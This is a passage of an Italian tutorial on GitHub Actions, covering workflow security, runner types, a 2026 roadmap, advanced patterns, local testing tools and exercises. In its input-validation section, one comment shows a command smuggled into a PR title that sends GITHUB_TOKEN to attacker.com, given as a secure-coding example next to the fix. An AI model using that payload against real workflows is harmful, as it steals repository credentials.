    permissions:
      pull-requests: write
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: test-results
      - name: Commenta risultati sulla PR
        uses: actions/github-script@v7
        with:
          script: |
            // Solo dati generati dal job precedente, non codice del fork
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'Test completati. Risultati disponibili negli artifacts.'
            });
```

### Validazione degli Input

Quando si creano azioni personalizzate o si accettano input esterni, validare sempre i dati per prevenire injection:

```yaml
steps:
  # PERICOLOSO: injection tramite titolo della PR
  - name: Esempio vulnerabile
    run: echo "PR: ${{ github.event.pull_request.title }}"
    # Un titolo come: "; curl http://attacker.com/steal?token=$GITHUB_TOKEN"
    # potrebbe causare l'esecuzione di comandi arbitrari

  # SICURO: passare come variabile d'ambiente
  - name: Esempio sicuro
    run: echo "PR: ${PR_TITLE}"
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
      # La variabile d'ambiente impedisce l'injection nel comando shell
```

### Regole di Protezione del Workflow

Per repository con requisiti di sicurezza elevati, abilitare le regole di protezione tramite rulesets:

1. **Require approval for workflow changes**: Richiede che le modifiche ai file in `.github/workflows/` siano approvate prima del merge.
2. **Restrict third-party actions**: Limitare le azioni consentite a quelle first-party di GitHub e a una lista di azioni approvate dall'organizzazione.
3. **Fork pull request workflows require approval**: Richiedere approvazione manuale prima che i workflow vengano eseguiti su PR dai fork.

---

## Runner Avanzati — Larger, GPU, ARM

GitHub offre ai clienti dei piani Team e Enterprise Cloud una gamma di runner avanzati con risorse hardware superiori ai runner standard. Questi runner sono indicati come **larger runners** e permettono di eseguire workload che richiedono maggiore potenza di calcolo, piu' memoria, storage SSD veloce, o architetture specifiche.

### Larger Runners (Linux e Windows)

I larger runners sono disponibili con configurazioni che vanno da 4 a 64 vCPU:

| Tipo | vCPU | RAM | Storage SSD | Costo/min approssimativo |
|------|------|-----|-------------|--------------------------|
| 4-core | 4 | 16 GB | 150 GB | $0.016 |
| 8-core | 8 | 32 GB | 300 GB | $0.032 |
| 16-core | 16 | 64 GB | 600 GB | $0.064 |
| 32-core | 32 | 128 GB | 840 GB | $0.128 |
| 64-core | 64 | 256 GB | 2040 GB | $0.256 |

I larger runners sono configurabili dalla UI di GitHub in Settings > Actions > Runners > New runner. Una volta creato, il runner riceve un label personalizzato utilizzabile in `runs-on`:

```yaml
jobs:
  heavy-build:
    # Utilizza un larger runner con 16 core
    runs-on: mia-org-linux-16core
    steps:
      - uses: actions/checkout@v4
      - name: Build parallelizzata
        run: make -j16 build
```

### GPU Runners

I GPU runners sono disponibili per workload di machine learning, rendering, e calcolo parallelo:

| Configurazione | GPU | vCPU | RAM | Costo/min approssimativo |
|----------------|-----|------|-----|--------------------------|
| GPU 4-core | 1x NVIDIA T4 | 4 | 28 GB | $0.070 |

```yaml
jobs:
  ml-training:
    runs-on: mia-org-gpu-t4
    steps:
      - uses: actions/checkout@v4

      - name: Setup CUDA
        run: |
          nvidia-smi
          nvcc --version

      - name: Training modello
        run: python train.py --epochs 50 --device cuda
```

### ARM Runners

I runner ARM64 sono disponibili in anteprima pubblica per Linux e Windows, permettendo build native per architettura ARM senza emulazione QEMU:

```yaml
jobs:
  build-arm:
    # Runner ARM64 nativo
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: actions/checkout@v4

      - name: Verifica architettura
        run: |
          uname -m  # Dovrebbe mostrare aarch64
          arch       # Conferma architettura ARM

      - name: Build nativa ARM
        run: |
          cargo build --release --target aarch64-unknown-linux-gnu
```

**Vantaggi dei runner ARM rispetto all'emulazione QEMU:**

- Velocita' di build 2-5x superiore rispetto all'emulazione su x64.
- Prezzo inferiore rispetto ai runner x64 equivalenti (circa 37% in meno).
- Test nativi senza overhead di emulazione.
- Ideali per build di immagini Docker multi-architettura.

```yaml
# Confronto: emulazione vs nativo per Docker multi-arch
jobs:
  # Approccio 1: emulazione QEMU su x64 (piu' lento)
  build-emulated:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/setup-qemu-action@v3
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          platforms: linux/amd64,linux/arm64
          push: true
          tags: mia-app:latest

  # Approccio 2: build native parallele (piu' veloce)
  build-amd64:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/build-push-action@v6
        with:
          platforms: linux/amd64
          push: true
          tags: mia-app:latest-amd64

  build-arm64:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: docker/build-push-action@v6
        with:
          platforms: linux/arm64
          push: true
          tags: mia-app:latest-arm64

  # Crea manifest multi-arch dopo entrambe le build
  create-manifest:
    needs: [build-amd64, build-arm64]
    runs-on: ubuntu-latest
    steps:
      - run: |
          docker manifest create mia-app:latest \
            mia-app:latest-amd64 \
            mia-app:latest-arm64
          docker manifest push mia-app:latest
```

---

## Novita' e Roadmap 2026

GitHub ha pubblicato una roadmap di sicurezza ambiziosa per il 2026, introducendo funzionalita' che trasformano il modello di sicurezza di GitHub Actions da reattivo a proattivo. Le novita' principali riguardano il locking delle dipendenze, il firewall di rete, i secrets con scope ridotto e il monitoraggio avanzato.

### Dependency Locking per i Workflow

La funzionalita' piu' attesa e' il **dependency locking**: una nuova sezione `dependencies` nel YAML del workflow che blocca tutte le dipendenze dirette e transitive con il commit SHA, in modo simile a `go.sum` per Go o `package-lock.json` per Node.js, ma per l'intero workflow.

```yaml
# Esempio della futura sintassi dependency locking
name: CI Pipeline

dependencies:
  actions/checkout:
    version: v4.2.2
    integrity: sha256:a1b2c3d4e5f6...
  actions/setup-node:
    version: v4.1.0
    integrity: sha256:f6e5d4c3b2a1...

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout  # Versione risolta dal lockfile
      - uses: actions/setup-node
```

**Vantaggi del dependency locking:**

- Ogni esecuzione del workflow utilizza esattamente lo stesso codice che e' stato rivisto e approvato.
- Le modifiche alle dipendenze appaiono come diff visibili nelle pull request.
- Elimina il rischio di attacchi tramite tag mobili o release compromesse.
- I piani futuri includono la deprecazione dei riferimenti mutabili in favore di release immutabili.

### Egress Firewall Nativo

GitHub sta costruendo un firewall di rete nativo per i runner hosted, operante a **Layer 7** e posizionato **esternamente alla VM del runner**. Questo significa che rimane operativo e immutabile anche se un attaccante ottiene accesso root all'interno dell'ambiente di esecuzione.

**Capacita' del firewall:**

- Monitoraggio di tutto il traffico in uscita dai runner.
- Ogni richiesta viene automaticamente correlata al workflow, job, step e comando che l'ha generata.
- Le organizzazioni possono definire policy di rete (allow/deny) per domini e servizi specifici.
- Registrazione completa per audit e compliance.
- Rilevamento di pattern di esfiltrazione di dati sospetti.

### Secrets con Scope Ridotto (Scoped Secrets)

I **scoped secrets** permettono di vincolare le credenziali a contesti di esecuzione specifici, riducendo la superficie di attacco:

- Un secret puo' essere limitato a un workflow specifico, a un job specifico, o anche a un singolo step.
- Le credenziali non sono accessibili al di fuori dello scope definito, anche in caso di compromissione di altri step del workflow.
- Integrazione con OIDC per generare credenziali temporanee con scope minimo.

### Policy di Esecuzione a Livello Organization

Le nuove **policy controls** permettono alle organizzazioni di definire regole centralizzate:

- Chi puo' triggerare workflow e quali eventi sono consentiti.
- Quali azioni di terze parti sono permesse (allowlist a livello organizzazione).
- Requisiti di approvazione per workflow che accedono a risorse sensibili.
- Enforcement centralizzato anziche' configurazione per singolo repository.

### Actions Data Stream

L'**Actions Data Stream** fornisce telemetria in tempo quasi reale sulle esecuzioni dei workflow:

- Metriche dettagliate su tempi di esecuzione, utilizzo risorse, pattern di accesso.
- Integrazione con sistemi SIEM (Splunk, Datadog, ecc.) per correlazione eventi.
- Rilevamento anomalie automatico per identificare comportamenti sospetti.
- Dashboard centralizzata per monitoraggio e reporting.

### Aggiornamento Prezzi 2026

A partire dal 1 gennaio 2026, GitHub ha introdotto riduzioni di prezzo fino al 39% per i runner hosted. Contemporaneamente, dal 1 marzo 2026, e' stata introdotta una tariffa di piattaforma cloud di **$0.002 per minuto** applicabile a tutti i workflow, inclusi quelli su self-hosted runner. Questa tariffa copre l'infrastruttura di orchestrazione, l'autenticazione OIDC, il sistema di secrets e le funzionalita' di piattaforma.

**Impatto sui clienti:** Secondo GitHub, il 96% dei clienti non vedra' alcun cambiamento nella fatturazione. Del 4% impattato, l'85% vedra' una riduzione e il restante 15% un aumento mediano di circa $13/mese. I repository pubblici rimangono gratuiti per l'esecuzione dei workflow.

### OIDC Custom Property Claims

L'OIDC e' stato esteso con **custom property claims** (GA da aprile 2026), che permettono di includere proprieta' personalizzate del repository nei token OIDC. Questo consente ai cloud provider di implementare policy di accesso piu' granulari basate su attributi come team, progetto o classificazione di sicurezza del repository.

---

## Pattern Avanzati

### Workflow Chaining con workflow_run

Il pattern di **workflow chaining** utilizza l'evento `workflow_run` per creare catene di workflow dove uno si attiva al completamento di un altro:

```yaml
# .github/workflows/post-ci.yml
# Si attiva DOPO il completamento del workflow CI
name: Post-CI Tasks

on:
  workflow_run:
    workflows: ["CI Pipeline"]
    types: [completed]
    branches: [main]

permissions:
  contents: read
  statuses: write
  deployments: write

jobs:
  # Esegui solo se il workflow CI e' passato
  deploy-preview:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.workflow_run.head_sha }}

      - name: Scarica artifacts dal workflow precedente
        uses: actions/download-artifact@v4
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
          name: build-output
          path: dist/

      - name: Deploy preview
        run: |
          echo "Deploy della build dal workflow CI #${{ github.event.workflow_run.run_number }}"
          echo "SHA: ${{ github.event.workflow_run.head_sha }}"

  # Notifica in caso di fallimento del CI
  notify-failure:
    if: github.event.workflow_run.conclusion == 'failure'
    runs-on: ubuntu-latest
    steps:
      - name: Notifica team
        run: |
          echo "Il workflow CI e' fallito sul branch ${{ github.event.workflow_run.head_branch }}"
          # Invia notifica Slack, email, ecc.
```

### Trigger da Sistemi Esterni con repository_dispatch

L'evento `repository_dispatch` permette di triggerare workflow da sistemi esterni tramite API REST, abilitando integrazioni con piattaforme esterne a GitHub:

```yaml
# .github/workflows/external-trigger.yml
name: External Trigger Handler

on:
  repository_dispatch:
    types: [deploy-request, rollback-request, config-update]

permissions:
  contents: read
  deployments: write

jobs:
  handle-deploy:
    if: github.event.action == 'deploy-request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.client_payload.ref || 'main' }}

      - name: Deploy
        run: |
          echo "Deploy richiesto da: ${{ github.event.client_payload.requester }}"
          echo "Ambiente: ${{ github.event.client_payload.environment }}"
          echo "Versione: ${{ github.event.client_payload.version }}"

  handle-rollback:
    if: github.event.action == 'rollback-request'
    runs-on: ubuntu-latest
    steps:
      - name: Rollback
        run: |
          echo "Rollback alla versione: ${{ github.event.client_payload.target_version }}"
```

**Triggerare il workflow da un sistema esterno:**

```bash
# Chiamata API per triggerare il workflow
curl -X POST \
  -H "Authorization: Bearer ${GITHUB_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/OWNER/REPO/dispatches \
  -d '{
    "event_type": "deploy-request",
    "client_payload": {
      "ref": "v2.1.5",
      "environment": "production",
      "version": "2.1.5",
      "requester": "sistema-monitoring"
    }
  }'
```

### Matrice Dinamica da File di Configurazione

Una tecnica avanzata consiste nel generare la matrice di build dinamicamente da un file di configurazione, permettendo di modificare le combinazioni senza toccare il workflow:

```yaml
# build-matrix.json nella root del repository
# {
#   "include": [
#     {"service": "api", "node": "20", "dockerfile": "api.Dockerfile"},
#     {"service": "web", "node": "22", "dockerfile": "web.Dockerfile"},
#     {"service": "worker", "node": "20", "dockerfile": "worker.Dockerfile"}
#   ]
# }

name: Dynamic Matrix CI

on: [push]

jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set.outputs.matrix }}
    steps:
      - uses: actions/checkout@v4
      - id: set
        run: |
          MATRIX=$(cat build-matrix.json)
          echo "matrix=${MATRIX}" >> $GITHUB_OUTPUT

  build:
    needs: prepare
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix: ${{ fromJSON(needs.prepare.outputs.matrix) }}
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}

      - name: Build servizio ${{ matrix.service }}
        run: |
          echo "Building ${{ matrix.service }} con Node ${{ matrix.node }}"
          docker build -f ${{ matrix.dockerfile }} -t ${{ matrix.service }}:latest .
```

### Deployment Progressivo (Canary/Blue-Green)

Un pattern di deployment avanzato che implementa rilascio graduale con rollback automatico:

```yaml
# .github/workflows/canary-deploy.yml
name: Canary Deployment

on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write
  deployments: write

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image-tag: ${{ steps.meta.outputs.version }}
    steps:
      - uses: actions/checkout@v4

      - name: Build e push immagine
        id: meta
        run: |
          IMAGE_TAG="sha-${GITHUB_SHA::8}"
          echo "version=${IMAGE_TAG}" >> $GITHUB_OUTPUT
          echo "Immagine: app:${IMAGE_TAG}"

  canary:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: canary
    steps:
      - name: Deploy canary (10% traffico)
        run: |
          echo "Deploy canary: ${{ needs.build.outputs.image-tag }}"
          echo "Routing 10% del traffico alla nuova versione"

      - name: Attendi e verifica metriche
        run: |
          echo "Monitoraggio metriche per 5 minuti..."
          # In produzione reale: query Prometheus/Datadog per error rate
          # Se error rate > soglia, fallisci lo step
          sleep 10
          echo "Metriche nella norma"

  production:
    needs: [build, canary]
    runs-on: ubuntu-latest
    environment:
      name: production
    concurrency:
      group: production-deploy
      cancel-in-progress: false
    steps:
      - name: Promozione a produzione (100% traffico)
        run: |
          echo "Promozione: ${{ needs.build.outputs.image-tag }}"
          echo "Routing 100% del traffico alla nuova versione"

      - name: Verifica post-deploy
        run: |
          echo "Health check produzione..."
          # Verifica endpoint di salute
```

### Gestione Multi-Ambiente con Variabili Dinamiche

Un pattern per gestire configurazioni diverse per ambiente senza duplicare workflow:

```yaml
name: Multi-Environment Deploy

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Ambiente target'
        required: true
        type: choice
        options: [dev, staging, production]

jobs:
  configure:
    runs-on: ubuntu-latest
    outputs:
      aws-region: ${{ steps.config.outputs.aws-region }}
      cluster-name: ${{ steps.config.outputs.cluster-name }}
      replicas: ${{ steps.config.outputs.replicas }}
    steps:
      - id: config
        run: |
          case "${{ inputs.environment }}" in
            dev)
              echo "aws-region=eu-west-1" >> $GITHUB_OUTPUT
              echo "cluster-name=dev-cluster" >> $GITHUB_OUTPUT
              echo "replicas=1" >> $GITHUB_OUTPUT
              ;;
            staging)
              echo "aws-region=eu-west-1" >> $GITHUB_OUTPUT
              echo "cluster-name=staging-cluster" >> $GITHUB_OUTPUT
              echo "replicas=2" >> $GITHUB_OUTPUT
              ;;
            production)
              echo "aws-region=eu-central-1" >> $GITHUB_OUTPUT
              echo "cluster-name=prod-cluster" >> $GITHUB_OUTPUT
              echo "replicas=3" >> $GITHUB_OUTPUT
              ;;
          esac

  deploy:
    needs: configure
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - uses: actions/checkout@v4

      - name: Deploy a ${{ inputs.environment }}
        run: |
          echo "Regione: ${{ needs.configure.outputs.aws-region }}"
          echo "Cluster: ${{ needs.configure.outputs.cluster-name }}"
          echo "Repliche: ${{ needs.configure.outputs.replicas }}"
```

---

## Strumenti di Validazione e Testing Locale

La validazione dei workflow prima del push e' fondamentale per ridurre i tempi di feedback e lo spreco di minuti CI. Diversi strumenti permettono di verificare la correttezza sintattica e logica dei workflow senza eseguirli su GitHub.

### actionlint — Linter Statico per Workflow

**actionlint** e' un linter statico dedicato ai file di workflow GitHub Actions. Verifica la correttezza della sintassi YAML, la validita' delle espressioni, la coerenza dei tipi nei contesti, e segnala errori comuni che sfuggono alla validazione di GitHub.

```bash
# Installazione
# macOS
brew install actionlint

# Linux (download binario)
curl -sL https://github.com/rhysd/actionlint/releases/latest/download/actionlint_linux_amd64.tar.gz | tar xz
sudo mv actionlint /usr/local/bin/

# Analisi di tutti i workflow
actionlint

# Analisi di un file specifico
actionlint .github/workflows/ci.yml

# Output in formato SARIF (per integrazione con GitHub Code Scanning)
actionlint -format sarif > actionlint-results.sarif
```

**Errori rilevati da actionlint:**

- Espressioni `${{ }}` con sintassi errata o contesti inesistenti.
- Tipi incompatibili (es. `if: github.event.pull_request.draft == 'false'` — dovrebbe essere `== false` senza quotes).
- Actions con input obbligatori mancanti.
- Label di runner inesistenti o errati.
- Globs in `paths` e `paths-ignore` con pattern invalidi.
- Permessi GITHUB_TOKEN sconosciuti.
- Conflitti tra `paths` e `paths-ignore` nello stesso evento.

**Integrazione di actionlint nel workflow CI:**

```yaml
name: Lint Workflows

on:
  pull_request:
    paths:
      - '.github/workflows/**'

jobs:
  lint-workflows:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Installa actionlint
        run: |
          LATEST=$(curl -sL https://api.github.com/repos/rhysd/actionlint/releases/latest | jq -r .tag_name)
          curl -sL "https://github.com/rhysd/actionlint/releases/download/${LATEST}/actionlint_${LATEST#v}_linux_amd64.tar.gz" | tar xz
          sudo mv actionlint /usr/local/bin/

      - name: Esegui actionlint
        run: actionlint -color
```

### act — Esecuzione Locale dei Workflow

**act** (di nektos) permette di eseguire workflow GitHub Actions localmente utilizzando container Docker per simulare l'ambiente dei runner GitHub. E' lo strumento piu' completo per il testing locale dei workflow.

```bash
# Installazione
# macOS
brew install act

# Linux
curl -s https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash

# Windows (con chocolatey)
choco install act-cli
```

**Utilizzo di act:**

```bash
# Simula un evento push
act push

# Simula un evento pull_request
act pull_request

# Esegui solo un job specifico
act -j test

# Esegui con un file di eventi personalizzato
act push --eventpath event.json

# Passa secrets
act -s MY_SECRET=valore_segreto

# Passa secrets da file
act --secret-file .secrets

# Usa un'immagine runner specifica
act -P ubuntu-latest=catthehacker/ubuntu:full-latest

# Simula workflow_dispatch con input
act workflow_dispatch --input environment=staging --input debug_enabled=true

# Lista tutti i workflow e job disponibili
act -l

# Dry run (mostra cosa verrebbe eseguito senza eseguire)
act -n push

# Verboso per debug
act -v push
```

**File `.secrets` per act:**

```
# .secrets (aggiungere a .gitignore!)
GITHUB_TOKEN=ghp_xxxxxxxxxxxxx
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
SLACK_WEBHOOK=https://hooks.slack.com/services/xxx/yyy/zzz
```

**File `.actrc` per configurazione persistente:**

```
# .actrc
-P ubuntu-latest=catthehacker/ubuntu:act-latest
-P ubuntu-22.04=catthehacker/ubuntu:act-22.04
--secret-file .secrets
--env-file .env
```

**Limitazioni di act:**

- Supporta **solo runner Linux**; non e' possibile simulare runner Windows o macOS.
- Alcune actions del Marketplace potrebbero non funzionare correttamente nell'ambiente Docker locale.
- Le actions che dipendono da servizi GitHub specifici (GITHUB_TOKEN con permessi reali, GitHub API) richiedono configurazione aggiuntiva.
- La cache di GitHub Actions (`actions/cache`) non e' completamente supportata.
- Le GitHub Expressions complesse possono avere comportamenti leggermente diversi.

### Yaml Lint per Validazione Sintattica

Come complemento ad actionlint, **yamllint** verifica la correttezza generale della sintassi YAML:

```bash
# Installazione
pip install yamllint

# Analisi dei file workflow
yamllint .github/workflows/

# Con configurazione personalizzata
cat > .yamllint.yml << 'EOF'
extends: default
rules:
  line-length:
    max: 200
  truthy:
    check-keys: false
  comments:
    min-spaces-from-content: 1
EOF

yamllint -c .yamllint.yml .github/workflows/
```

### Pre-commit Hook per Validazione Automatica

Integrare la validazione dei workflow nel flusso di sviluppo locale tramite pre-commit hooks:

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/rhysd/actionlint
    rev: v1.7.7
    hooks:
      - id: actionlint

  - repo: https://github.com/adrienverge/yamllint
    rev: v1.35.1
    hooks:
      - id: yamllint
        args: [-c, .yamllint.yml]
        files: \.ya?ml$
```

```bash
# Installazione e attivazione
pip install pre-commit
pre-commit install

# Esecuzione manuale su tutti i file
pre-commit run --all-files
```

### Test per Azioni Personalizzate

Per le azioni personalizzate (JavaScript, Docker, Composite), e' fondamentale implementare test automatizzati:

**Test unitari per JavaScript action:**

```javascript
// __tests__/index.test.js
const process = require('process');
const cp = require('child_process');
const path = require('path');

describe('Coverage Checker Action', () => {
  test('fallisce quando il file di copertura non esiste', () => {
    process.env['INPUT_COVERAGE-FILE'] = 'non-esiste.json';
    process.env['INPUT_THRESHOLD'] = '80';
    process.env['INPUT_FAIL-ON-THRESHOLD'] = 'true';

    const entryPoint = path.join(__dirname, '..', 'index.js');
    const result = cp.spawnSync('node', [entryPoint], { env: process.env });

    expect(result.stderr.toString()).toContain('File di copertura non trovato');
  });

  test('passa quando la copertura supera la soglia', () => {
    // Prepara un file di copertura di test
    const fs = require('fs');
    const testReport = {
      total: {
        statements: { total: 100, covered: 85 }
      }
    };
    fs.writeFileSync('/tmp/test-coverage.json', JSON.stringify(testReport));

    process.env['INPUT_COVERAGE-FILE'] = '/tmp/test-coverage.json';
    process.env['INPUT_THRESHOLD'] = '80';
    process.env['INPUT_FAIL-ON-THRESHOLD'] = 'true';
    process.env['GITHUB_OUTPUT'] = '/tmp/github-output';
    process.env['GITHUB_STEP_SUMMARY'] = '/tmp/github-summary';

    fs.writeFileSync('/tmp/github-output', '');
    fs.writeFileSync('/tmp/github-summary', '');

    const entryPoint = path.join(__dirname, '..', 'index.js');
    const result = cp.spawnSync('node', [entryPoint], { env: process.env });

    expect(result.status).toBe(0);

    // Cleanup
    fs.unlinkSync('/tmp/test-coverage.json');
  });
});
```

**Workflow di test per azioni personalizzate:**

```yaml
# .github/workflows/test-action.yml
name: Test Action

on:
  push:
    paths:
      - 'action.yml'
      - 'src/**'
      - '__tests__/**'
      - 'package.json'
  pull_request:

jobs:
  unit-test:
    name: Test Unitari
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm test

  integration-test:
    name: Test di Integrazione
    needs: unit-test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Testa l'azione come la userebbe un consumatore
      - name: Prepara dati di test
        run: |
          mkdir -p coverage
          echo '{"total":{"statements":{"total":100,"covered":90}}}' > coverage/report.json

      - name: Esegui azione (dovrebbe passare)
        id: pass-test
        uses: ./
        with:
          coverage-file: coverage/report.json
          threshold: '80'
          fail-on-threshold: 'true'

      - name: Verifica output
        run: |
          echo "Copertura: ${{ steps.pass-test.outputs.coverage-percentage }}"
          echo "Sopra soglia: ${{ steps.pass-test.outputs.above-threshold }}"
          test "${{ steps.pass-test.outputs.above-threshold }}" = "true"

      - name: Esegui azione (dovrebbe fallire)
        id: fail-test
        continue-on-error: true
        uses: ./
        with:
          coverage-file: coverage/report.json
          threshold: '95'
          fail-on-threshold: 'true'

      - name: Verifica che il fallimento sia stato corretto
        run: test "${{ steps.fail-test.outcome }}" = "failure"
```

---

## Esercizi

### Esercizio 1: Workflow CI Base con Matrix

```yaml
# Obiettivo: creare un workflow CI che testa su più versioni e OS

# File: .github/workflows/ci.yml
name: CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
        node-version: [18, 20, 22]
      fail-fast: false
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      - run: npm ci
      - run: npm test
      - run: npm run lint

# Compiti:
# 1. Aggiungere windows-latest alla matrix (ma escludere node 18 su Windows)
# 2. Aggiungere timeout-minutes: 15 al job
# 3. Aggiungere concurrency per cancellare run precedenti sulla stessa PR
# 4. Verificare il workflow con: act push (se act è installato)
```

### Esercizio 2: Caching e Artifact

```yaml
# Obiettivo: ottimizzare i tempi CI con cache e gestire artifact

name: Build & Cache
on: [push]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Cache node_modules
        uses: actions/cache@v4
        id: cache-deps
        with:
          path: node_modules
          key: deps-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
          restore-keys: |
            deps-${{ runner.os }}-

      - name: Install dependencies
        if: steps.cache-deps.outputs.cache-hit != 'true'
        run: npm ci

      - name: Build
        run: npm run build

      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 7

# Compiti:
# 1. Aggiungere un job "deploy" che scarica l'artifact con download-artifact
# 2. Configurare il job deploy con needs: [build]
# 3. Aggiungere cache per pip (Python) o cargo (Rust) come variante
# 4. Misurare il tempo con e senza cache
```

### Esercizio 3: Secrets e Deploy Multi-Ambiente

```yaml
# Obiettivo: configurare deploy a staging e production con secrets per-environment

name: Deploy
on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options: [staging, production]

permissions:
  contents: read
  deployments: write

jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to Staging
        env:
          API_KEY: ${{ secrets.STAGING_API_KEY }}
          DEPLOY_URL: ${{ vars.STAGING_URL }}
        run: |
          echo "Deploying to staging..."
          # Il secret non viene mai stampato nei log
          echo "API_KEY length: ${#API_KEY}"

  deploy-production:
    needs: deploy-staging
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to Production
        env:
          API_KEY: ${{ secrets.PRODUCTION_API_KEY }}
        run: echo "Deploying to production..."

# Compiti:
# 1. Configurare gli environment "staging" e "production" nel repo (Settings → Environments)
# 2. Aggiungere required reviewers all'environment production
# 3. Aggiungere wait timer di 5 minuti sull'environment production
# 4. Creare i secrets STAGING_API_KEY e PRODUCTION_API_KEY
# 5. Testare il workflow_dispatch manuale dalla tab Actions
```

### Esercizio 4: Composite Action Riutilizzabile

```yaml
# Obiettivo: creare una composite action per setup e test riutilizzabile

# File: .github/actions/setup-and-test/action.yml
name: 'Setup and Test'
description: 'Installa dipendenze, esegue test e genera report'
inputs:
  node-version:
    description: 'Node.js version'
    required: false
    default: '20'
  coverage-threshold:
    description: 'Minimum coverage percentage'
    required: false
    default: '80'
runs:
  using: 'composite'
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'
    - run: npm ci
      shell: bash
    - run: npm test -- --coverage --coverageThreshold='{"global":{"branches":${{ inputs.coverage-threshold }}}}'
      shell: bash
    - run: npm run lint
      shell: bash

# Uso nel workflow:
# jobs:
#   test:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v4
#       - uses: ./.github/actions/setup-and-test
#         with:
#           node-version: '22'
#           coverage-threshold: '90'

# Compiti:
# 1. Creare la composite action nella directory corretta
# 2. Usarla in un workflow CI
# 3. Aggiungere un output "coverage-result" alla composite action
# 4. Creare una seconda composite action per il deploy
```

### Esercizio 5: Reusable Workflow con workflow_call

```yaml
# Obiettivo: creare un workflow riutilizzabile a livello organizzazione

# File: .github/workflows/reusable-ci.yml (nel repo centrale dell'org)
name: Reusable CI
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: '20'
      run-e2e:
        type: boolean
        default: false
    secrets:
      SONAR_TOKEN:
        required: false

permissions:
  contents: read
  checks: write

jobs:
  lint-and-test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm test -- --coverage

  e2e:
    if: inputs.run-e2e
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
      - run: npm ci
      - run: npx playwright install --with-deps
      - run: npx playwright test

# Chiamata dal repository consumer:
# File: .github/workflows/ci.yml
# name: CI
# on: [push, pull_request]
# jobs:
#   ci:
#     uses: MY-ORG/.github/.github/workflows/reusable-ci.yml@main
#     with:
#       node-version: '22'
#       run-e2e: true
#     secrets:
#       SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

# Compiti:
# 1. Creare il reusable workflow nel repository .github dell'org
# 2. Chiamarlo da un repository consumer
# 3. Aggiungere un job di security scanning al reusable workflow
# 4. Testare con e senza e2e abilitato
# 5. Aggiungere un output "test-passed" al workflow riutilizzabile
```

---

## Letture e Riferimenti

### Documentazione ufficiale

- **GitHub Actions Documentation**: https://docs.github.com/en/actions — Documentazione completa con guide, reference e tutorial.
- **Workflow Syntax Reference**: https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions — Specifica YAML completa per workflow.
- **GitHub Actions Marketplace**: https://github.com/marketplace?type=actions — Catalogo di actions community e verificate.
- **Reusable Workflows**: https://docs.github.com/en/actions/using-workflows/reusing-workflows — Guida ai workflow riutilizzabili con `workflow_call`.
- **GitHub Actions Starter Workflows**: https://github.com/actions/starter-workflows — Template ufficiali per CI/CD di vari linguaggi.
